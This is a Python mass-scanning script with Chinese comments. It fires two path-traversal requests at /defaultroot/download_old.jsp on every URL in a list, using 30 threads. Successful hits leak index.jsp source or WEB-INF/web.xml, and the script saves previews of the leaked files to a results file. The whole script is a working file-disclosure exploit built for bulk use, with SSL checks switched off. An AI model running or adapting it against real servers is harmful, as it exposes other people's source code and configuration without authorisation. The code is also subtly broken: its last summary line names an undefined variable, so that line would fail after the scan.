import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import time

# 全局变量
results_file = "result.txt"
urls_file = "url.txt"
thread_count = 30
lock = threading.Lock()

def check_vulnerability(url):
    """
    检测单个URL的漏洞
    """
    # 定义两个POC路径
    poc_paths = [
        "/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp",
        "/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml"
    ]
    
    vulnerable_pocs = []
    
    for poc_path in poc_paths:
        target_url = urljoin(url.rstrip('/') + '/', poc_path.lstrip('/'))
        
        try:
            # 发送请求
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(
                target_url, 
                headers=headers, 
                timeout=10, 
                verify=False,  # 忽略SSL证书验证
                allow_redirects=False  # 不自动重定向
            )
            
            # 检查响应状态码 - 3xx重定向视为没有漏洞
            if 300 <= response.status_code < 400:
                print(f"[-] {poc_path.split('=')[-1]} 重定向响应: {url} - 状态码: {response.status_code}")
                continue
                
            # 只处理200状态码
            if response.status_code == 200:
                content = response.text
                
                # 根据不同的POC使用不同的验证逻辑
                if "index.jsp" in poc_path:
                    # 更严格的index.jsp检测逻辑
                    jsp_indicators = [
                        '<%@ page',  # JSP指令
                        '<jsp:',     # JSP标签
                        '.jsp"'      # JSP文件引用
                    ]
                    
                    # 排除误报的特征
                    false_positive_indicators = [
                        'error',
                        'not found',
                        '404',
                        '无法找到',
                        '不存在'
                    ]
                    
                    # 检查内容长度，避免空页面或错误页面
                    if len(content) < 100:
                        print(f"[-] index.jsp 响应内容过短: {url} - 长度: {len(content)}")
                        continue
                    
                    # 检查是否包含JSP特征且不包含误报特征
                    has_jsp_indicator = any(indicator in content for indicator in jsp_indicators)
                    has_false_positive = any(fp in content.lower() for fp in false_positive_indicators)
                    
                    if has_jsp_indicator and not has_false_positive:
                        vulnerable_pocs.append({
                            'poc_type': 'index.jsp',
                            'url': target_url,
                            'status_code': response.status_code,
                            'content_length': len(content),
                            'content_preview': content[:200] + '...' if len(content) > 200 else content
                        })
                        print(f"[+] 漏洞存在 (index.jsp): {url}")
                    else:
                        print(f"[-] index.jsp 响应不符合特征: {url}")
                
                elif "web.xml" in poc_path:
                    # 检查web.xml的典型特征
                    web_xml_indicators = [
                        '<?xml version',
                        '<web-app',
                        '<servlet>',
                        '<servlet-name>',
                        '<servlet-class>',
                        '<welcome-file>',
                        'xmlns="http://java.sun.com/xml/ns/j2ee"',
                        'xmlns:javaee'
                    ]
                    
                    # 排除误报的特征
                    false_positive_indicators = [
                        'error',
                        'not found',
                        '404',
                        '无法找到',
                        '不存在'
                    ]
                    
                    # 检查内容长度，避免空页面或错误页面
                    if len(content) < 100:
                        print(f"[-] web.xml 响应内容过短: {url} - 长度: {len(content)}")
                        continue
                    
                    # 检查是否包含web.xml特征且不包含误报特征
                    has_webxml_indicator = any(indicator in content for indicator in web_xml_indicators)
                    has_false_positive = any(fp in content.lower() for fp in false_positive_indicators)
                    
                    if has_webxml_indicator and not has_false_positive:
                        vulnerable_pocs.append({
                            'poc_type': 'web.xml',
                            'url': target_url,
                            'status_code': response.status_code,
                            'content_length': len(content),
                            'content_preview': content[:200] + '...' if len(content) > 200 else content
                        })
                        print(f"[+] 漏洞存在 (web.xml): {url}")
                    else:
                        print(f"[-] web.xml 响应不符合特征: {url}")
            
            else:
                print(f"[-] {poc_path.split('=')[-1]} 状态码非200: {url} - 状态码: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] {poc_path.split('=')[-1]} 请求失败: {url} - 错误: {str(e)}")
        except Exception as e:
            print(f"[!] {poc_path.split('=')[-1]} 检测过程中出错: {url} - 错误: {str(e)}")
    
    # 如果有任何一个POC检测到漏洞，则记录结果
    if vulnerable_pocs:
        # 写入结果文件
        with lock:
            with open(results_file, 'a', encoding='utf-8') as f:
                f.write(f"=== 漏洞发现 ===\n")
                f.write(f"原始URL: {url}\n")
                f.write(f"发现时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                
                for poc_result in vulnerable_pocs:
                    f.write(f"\nPOC类型: {poc_result['poc_type']}\n")
                    f.write(f"测试URL: {poc_result['url']}\n")
                    f.write(f"状态码: {poc_result['status_code']}\n")
                    f.write(f"响应长度: {poc_result['content_length']} bytes\n")
                    f.write(f"内容预览: {poc_result['content_preview']}\n")
                
                f.write("="*50 + "\n\n")
        
        return True, url, f"发现 {len(vulnerable_pocs)} 个漏洞点"
    else:
        return False, url, "未发现漏洞"

def main():
    """
    主函数
    """
    # 读取URL列表
    try:
        with open(urls_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[错误] 找不到文件: {urls_file}")
        return
    except Exception as e:
        print(f"[错误] 读取文件失败: {e}")
        return
    
    if not urls:
        print("[错误] URL列表为空")
        return
    
    print(f"[*] 开始检测，共 {len(urls)} 个URL，线程数: {thread_count}")
    print(f"[*] 检测的POC路径:")
    print(f"    1. /defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp")
    print(f"    2. /defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml")
    print(f"[*] 注意: 3xx重定向响应将被视为没有漏洞")
    print(f"[*] 开始时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    # 清空结果文件
    with open(results_file, 'w', encoding='utf-8') as f:
        f.write(f"漏洞检测报告\n")
        f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"检测URL数量: {len(urls)}\n")
        f.write(f"检测POC:\n")
        f.write(f"  1. /defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp\n")
        f.write(f"  2. /defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml\n")
        f.write(f"检测规则:\n")
        f.write(f"  - 3xx重定向响应视为没有漏洞\n")
        f.write(f"  - 响应内容长度需大于100字节\n")
        f.write(f"  - 必须包含特定文件特征且不包含错误信息\n")
        f.write("="*60 + "\n\n")
    
    # 使用线程池进行并发检测
    vulnerable_count = 0
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                if result[0]:  # 如果漏洞存在
                    vulnerable_count += 1
            except Exception as e:
                print(f"[!] 任务执行异常: {url} - {e}")
    
    # 生成总结报告
    with open(results_file, 'a', encoding='utf-8') as f:
        f.write(f"\n检测总结:\n")
        f.write(f"总检测URL数: {len(urls)}\n")
        f.write(f"存在漏洞的URL数: {vulnerable_count}\n")
        f.write(f"完成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    print(f"\n[*] 检测完成!")
    print(f"[*] 总检测数: {len(urls)}")
    print(f"[*] 存在漏洞: {vulnerable_count}")
    print(f"[*] 结果已保存到: {result_file}")
    print(f"[*] 完成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")

if __name__ == "__main__":
    # 忽略SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()